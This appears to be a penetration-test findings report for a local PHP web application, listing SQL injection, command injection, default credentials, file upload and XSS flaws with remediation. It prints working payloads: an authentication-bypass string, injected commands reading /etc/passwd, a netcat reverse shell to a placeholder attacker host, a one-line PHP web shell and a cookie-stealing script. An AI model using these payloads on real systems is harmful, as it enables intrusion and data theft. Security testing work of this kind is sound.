## üö® Critical Findings

### [V001] SQL Injection in Login Form

**Severity:** Critical  
**CVSS Score:** 9.8 (Critical)  
**Affected Component:** `/login.php` (username parameter)  
**CWE:** CWE-89 (Improper Neutralization of Special Elements used in SQL Command)

**Description:**
The login form is vulnerable to SQL Injection due to unsanitized user input being directly concatenated into SQL queries. An attacker can manipulate the SQL query to bypass authentication or extract sensitive data.

**Proof of Concept:**
```
1. Navigate to http://localhost:8080/
2. Enter username: ' OR '1'='1
3. Enter password: anything
4. Click Login
5. Result: Authentication bypassed, SQL query shown
```

**Vulnerable Code Pattern:**
```php
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
// Direct concatenation = VULNERABLE
```

**Impact:**
- **Authentication Bypass:** Access without credentials
- **Data Extraction:** All database tables accessible via UNION
- **Potential Privilege Escalation:** Admin account compromise
- **Compliance Risk:** GDPR/PCI-DSS violations if production

**Exploitation Details:**
- sqlmap confirmed vulnerability in 0.3 seconds
- Database enumeration possible
- User credentials extractable

**Remediation:**

**Priority 1 (Immediate):**
```php
// Use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Priority 2 (Short-term):**
- Input validation (whitelist allowed characters)
- Implement WAF rules
- Database user with least privileges
- Parameterized queries for ALL database interactions

### [V002] OS Command Injection in Ping Utility

**Severity:** Critical  
**CVSS Score:** 9.9 (Critical)  
**Affected Component:** `/ping.php` (ip parameter)  
**CWE:** CWE-78 (OS Command Injection)

**Description:**
The ping utility executes user input directly in system commands without sanitization. Attackers can inject arbitrary OS commands.

**Proof of Concept:**
```
1. Navigate to Ping Tool section
2. Enter IP: 127.0.0.1; ls -la
3. Submit
4. Result: Directory listing shown (command executed)
```

**Impact:**
- **Remote Code Execution (RCE):** Full server compromise
- **Data Exfiltration:** Access to all server files
- **Lateral Movement:** Pivot to other systems
- **Backdoor Installation:** Persistent access

**Exploitation:**
```bash
# List files
127.0.0.1; ls -la

# Read sensitive files
127.0.0.1; cat /etc/passwd

# Reverse shell
127.0.0.1; nc attacker-ip 4444 -e /bin/bash
```

**Remediation:**

**Immediate:**
- Disable ping utility temporarily
- Review all exec/system calls in codebase

**Proper Fix:**
```php
// Validate input (whitelist)
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP");
}

// Use escapeshellarg()
$safe_ip = escapeshellarg($ip);
$output = shell_exec("ping -c 4 $safe_ip");

// Better: Use PHP sockets instead of shell commands
```

## ‚ö†Ô∏è High Severity Findings

### [V003] Weak Default Credentials

**Severity:** High  
**CVSS Score:** 8.1  
**CWE:** CWE-521 (Weak Password Requirements)

**Description:**
Admin account uses default credentials: `admin:admin123`

**Proof of Concept:**
- Attempted common credentials
- Success with admin:admin123
- Hydra brute-force: cracked in 12 seconds

**Impact:**
- Unauthorized admin access
- Full application control

**Remediation:**
1. Force password change on first login
2. Implement password policy:
   - Minimum 12 characters
   - Complexity requirements
   - No common passwords
3. Enable 2FA for admin accounts

---

### [V004] Unrestricted File Upload (RCE)

**Severity:** High  
**CVSS Score:** 8.8  
**CWE:** CWE-434 (Unrestricted Upload of Dangerous Type)

**Description:**
File upload accepts PHP files, enabling Remote Code Execution.

**Proof of Concept:**
1. Upload file: `shell.php` containing `<?php system($_GET['cmd']); ?>`
2. Access: `http://localhost:8080/uploads/shell.php?cmd=whoami`
3. Result: Command execution

**Remediation:**
- Whitelist allowed extensions (.jpg, .png only)
- Store uploads outside webroot
- Rename files on upload
- Check MIME type and magic bytes
- Set execute permissions to 644

---

## ‚ÑπÔ∏è Medium Severity Findings

### [V005] Cross-Site Scripting (XSS) in Comments

**Severity:** Medium  
**CVSS Score:** 6.1  
**CWE:** CWE-79 (XSS)

**Description:**
Comment form does not sanitize HTML/JavaScript.

**PoC:**
```html
<script>alert(document.cookie)</script>
```

**Impact:**
- Session hijacking
- Phishing attacks
- Malware distribution

**Remediation:**
```php
// Escape output
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');

// Or use Content Security Policy (CSP)
```
